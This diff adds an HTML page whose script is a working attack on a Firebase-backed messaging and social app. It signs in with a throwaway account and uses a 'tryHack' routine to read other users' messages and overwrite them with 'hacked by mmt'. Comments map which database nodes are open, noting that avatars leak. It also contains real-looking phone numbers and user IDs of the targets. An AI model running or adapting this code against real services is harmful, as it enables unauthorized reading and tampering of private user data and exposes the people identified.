@@ -1,0 +1,185 @@
+<script src="https://www.gstatic.com/firebasejs/4.0.0/firebase.js"></script>
+<script>
+  // Initialize Firebase
+  // TODO: Replace with your project's customized code snippet
+	var config = {
+	  apiKey: "api_key",
+	  authDomain: "firebase_app_domain",
+	  databaseURL: "firebase_db_url",
+	  storageBucket: "storage_bucket"
+  	};
+  	firebase.initializeApp(config);	
+	
+  	var database = firebase.database();
+	var auth = firebase.auth();
+	
+
+	
+	/*
+	
+	auth.createUserWithEmailAndPassword("opcon@hack.com", "opcon_hack").catch((e) => {
+		console.log(e);																	
+	}).then((e) => {
+		console.log(e);		
+	});
+	
+	*/
+	
+
+	
+	auth.signInWithEmailAndPassword("opcon@hack.com", "opcon_hack").catch((e) => {
+		console.log("error when login with email and password.", e);
+	});
+
+	auth.onAuthStateChanged((user) => {
+		if (user) {
+			console.log("logined as", user.email, user.uid)
+			// console.log(user)
+		} else {
+			console.log("failed login.");
+		}
+	});
+	
+	// *****************************SOCIAL***********************
+	
+	
+	
+	database.ref("social").on("value", (v) => {
+		console.log(v);
+	});
+	
+	database.ref("social");
+	
+	
+	function valueTestOn(where) {
+		database.ref(where).on("value", (v) => {
+			console.log("valueTestOn", where);
+			console.log(v.key, v.val());
+		});
+	}
+	
+	function childAddedTestOn(where) {
+		database.ref(where).on("child_added", (r) => {
+			console.log("childAddedTestOn", where);
+			console.log(r.key, r.val());
+		});
+	}
+	
+	function writeTestOnWithVals(where, vals) {
+		database.ref(where).set(vals);
+	}
+	
+	function queryTestOn(where) {
+		database.ref(where).orderByKey().limitToLast(10).on("child_added", (v) => {
+			console.log("queryTestOn(where):child_added");
+			console.log(v.key, v.val());
+		});
+		
+		database.ref(where).orderByKey().limitToLast(10).on("value", (v) => {
+			console.log("queryTestOn(where):value");
+			console.log(v.key, v.val());
+		});
+	}
+	
+	function queryTestOnWithChild(where, child) {
+		database.ref(where).orderByChild(child).limitToLast(10).on("child_added", (v) => {
+			console.log("queryTestOnWithChild(where):child_added", child);
+			console.log(v.key, v.val());
+		});
+		
+		database.ref(where).orderByChild(child).limitToLast(10).on("value", (v) => {
+			console.log("queryTestOnWithChild(where):value", child);
+			console.log(v.key, v.val());
+		});
+	}
+	
+	function test1(where) {
+		valueTestOn(where);
+		childAddedTestOn(where);
+		writeTestOn(where);
+		queryTestOn(where);
+	}
+	
+	function test2(where, writeVals) {
+		writeTestOnWithVals(where, writeVals);
+	}
+	
+	function test3(where, orderChild) {
+		queryTestOnWithChild(where, orderChild);
+	}
+	
+	
+	function tryHack(where, writeVals, orderBy) {
+		test1(where);
+		if (writeVals) {
+			test2(where, writeVals);
+		}
+		if (orderBy) {
+			test3(where, orderBy);
+		}
+	}
+	
+	var HACK_VALUE1 = {"opcon_sender": "oLy2AL4JwFPIIJOvY2MD9TlV83Q2",
+					 "opcon_receiver": "+9055369522337",
+					 "test": "hacked by mmt"};
+	
+	var HACK_VALUE = {
+		"key": "fqojel",
+		"path": "acks/+905462272550",
+		"root": "acks",
+		"target": "+905462272550"
+	};
+	
+	function writeTestOn(where) {
+		database.ref(where).set(HACK_VALUE1);
+	}
+	
+
+	tryHack("msgs/+905369522337/-Kl53zONpoa_xJkyguG6a", HACK_VALUE1, "opcon_sender");
+	tryHack("msgs/+905369522337/-Kl53zONpoa_xJkyguG6a", HACK_VALUE1);
+	
+	
+	// *****************************POSTS***********************
+	
+	// you cannot write to node of an users where user store 
+	// own posts. you just can read if you are friends of
+	// that users: social/contacts/userUid/{users...}
+	
+	/*
+	
+	
+	database.ref("posts").on("child_added", (f) => {
+		console.log(f.key, f.val());
+	})
+	
+	database.ref("posts/+905078784692").on("child_added", (f) => {
+		console.log(f.key, f.val());
+	})
+	
+	database.ref("posts/+905078784692/-KkycJJvT6nNyW7GjMVn").set({
+		test: "test"
+	});
+	
+	*/
+	
+	// *****************************USERS***********************
+	
+	// users node can't hack. but every user what tou know by hacker at the risk that
+	// they avatar can see by hacker.
+	
+	/*
+	
+	database.ref("users/+905462272550/avatar").on("value", function(snapshot) {
+		
+		console.log("hop!", snapshot.key, snapshot.val());
+		
+	});
+
+	database.ref("users").on("value", (s) => {
+		console.log(s.key, s.val());
+	});
+	
+	*/
+
+</script>
+
